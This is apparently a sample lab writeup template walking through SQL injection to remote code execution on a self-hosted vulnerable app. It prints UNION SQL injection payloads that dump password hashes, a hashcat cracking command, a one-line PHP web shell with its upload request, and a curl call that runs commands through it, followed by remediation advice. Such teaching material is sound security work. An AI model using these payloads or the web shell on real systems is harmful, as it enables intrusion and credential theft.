[SAMPLE WRITEUP - replace with your own: content/writeups/lab-sqli-to-rce.md]

# Lab: acme-notes - SQL Injection to RCE

Category: web | Difficulty: medium | Date: 2026-07-22
Tools: Burp Suite, ffuf, curl, a browser, python3

This is a sample writeup for a fictional, intentionally vulnerable lab app written to show the intended style. Replace it with your own.

## Scope and safety

acme-notes is a deliberately vulnerable lab application that I built and run locally at http://127.0.0.1:8080 for practice. Everything below was done against my own machine, with no real users and no real data. Do not run these techniques against systems you do not own or have explicit written permission to test.

## TL;DR

An unauthenticated search endpoint is vulnerable to UNION-based SQL injection. We use it to dump the admin password hash, crack it offline, and log in. The authenticated "attachments" feature does not validate file type, so we upload a PHP web shell and get remote code execution as the web server user.

Chain: unauth SQLi -> admin hash -> crack -> auth file upload -> RCE.

## Recon

Map the app first. Content discovery with ffuf:

```
$ ffuf -u http://127.0.0.1:8080/FUZZ -w wordlist.txt -mc 200,301,302 -e .php

/index.php         [Status: 200]
/login.php         [Status: 200]
/search.php        [Status: 200]
/notes.php         [Status: 302]   (redirects to login)
/upload.php        [Status: 302]   (redirects to login)
/uploads           [Status: 301]
```

So there is a public search, a login, and authenticated notes/upload features. /uploads looks like where attachments land.

The search page takes a q parameter:

```
GET /search.php?q=meeting HTTP/1.1
```

## Finding the injection

Add a single quote and watch for an error or a change in behavior:

```
GET /search.php?q=meeting' HTTP/1.1
-> 500 Internal Server Error, "SQL syntax" in the response
```

A single quote breaks the query and a doubled quote (or a comment) fixes it, which is the classic signature of string-context SQL injection.

Confirm with a boolean pair:

```
q=meeting' AND '1'='1     -> normal results
q=meeting' AND '1'='2     -> no results
```

The results track the condition, so we control the WHERE clause.

## UNION-based extraction

### Column count

Use ORDER BY to count columns until it errors:

```
q=meeting' ORDER BY 1-- -   -> ok
q=meeting' ORDER BY 2-- -   -> ok
q=meeting' ORDER BY 3-- -   -> ok
q=meeting' ORDER BY 4-- -   -> 500 error
```

Three columns. (Note the "-- -" comment: the trailing space after -- matters in MySQL.)

### Which columns print

Send a UNION with markers and a condition that returns no base rows, so only our row shows:

```
q=zzz' UNION SELECT 1,2,3-- -
```

The page renders "2" as the title and "3" as the body, so columns 2 and 3 are reflected. Column 1 is not displayed (likely an id).

### Enumerate the schema

```
q=zzz' UNION SELECT 1,table_name,3
       FROM information_schema.tables
       WHERE table_schema=database()-- -
```

Returns: notes, users.

```
q=zzz' UNION SELECT 1,column_name,3
       FROM information_schema.columns
       WHERE table_name='users'-- -
```

Returns: id, username, password, role.

### Dump the admin hash

```
q=zzz' UNION SELECT 1,
       concat(username,0x3a,password),
       role
       FROM users WHERE role='admin'-- -
```

Result (example):

```
admin:5f4dcc3b5aa765d61d8327deb882cf99
```

That is an unsalted MD5 hash - a weakness in itself.

## Cracking the hash

Unsalted MD5 falls quickly to a wordlist:

```
$ hashcat -m 0 -a 0 hashes.txt rockyou.txt
5f4dcc3b5aa765d61d8327deb882cf99:password
```

Credentials: admin / password. Log in at /login.php.

## Authenticated file upload to RCE

Now authenticated as admin, /upload.php accepts note attachments. Try uploading a normal image, then inspect where it lands:

```
POST /upload.php -> file saved to /uploads/<name>, original extension kept
```

The server trusts the client-supplied filename and does not check content type or extension. So instead of an image, upload a minimal PHP shell:

```php
<?php system($_GET['c']); ?>
```

Save it as shell.php and upload it:

```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----x
------x
Content-Disposition: form-data; name="attachment"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['c']); ?>
------x--
```

The response confirms the file was stored at /uploads/shell.php. Because /uploads is served by the same PHP-enabled server, requesting it executes the code:

```
$ curl 'http://127.0.0.1:8080/uploads/shell.php?c=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That is remote code execution as www-data. From here you could upgrade to an interactive reverse shell, but for the lab, proving execution is enough.

## Impact

Chaining an unauthenticated injection into admin access and then into code execution means a single public endpoint leads to full compromise of the application host (at the privilege of the web server, with further escalation likely from there).

## Remediation

### SQL injection
- Use parameterized queries / prepared statements for every query. Never build SQL by concatenating user input.
- Treat an ORM or query builder as the default; drop to raw SQL only with bound parameters.
- Do not leak database errors to clients. Log them server-side and return a generic message.

### Password storage
- Never store unsalted MD5. Use a slow, salted password hash (bcrypt, scrypt, or Argon2id).
- Enforce password strength and rate-limit login attempts.

### File upload
- Validate the file type by content, not by the client-supplied name or MIME header.
- Store uploads outside the web root, or in a location that is served as static data and cannot execute code.
- Generate server-side random filenames and force a safe extension.
- Disable script execution in the upload directory (for example, no PHP handler there).

### Defense in depth
- Run the app as a low-privileged user and apply least privilege to the database account.
- Add a WAF and monitoring as backup layers, not as the primary control.

## Lessons learned

- UNION-based SQLi is fast when you can see reflected columns. Spend the time to find which columns print before trying to extract anything.
- One weak link (unsalted MD5) turns a read primitive into full access.
- "Authenticated" is not a security boundary when the auth itself is one crackable hash away.
- Insecure file upload remains one of the most direct paths from a foothold to RCE. Validate by content and never let the upload directory execute code.
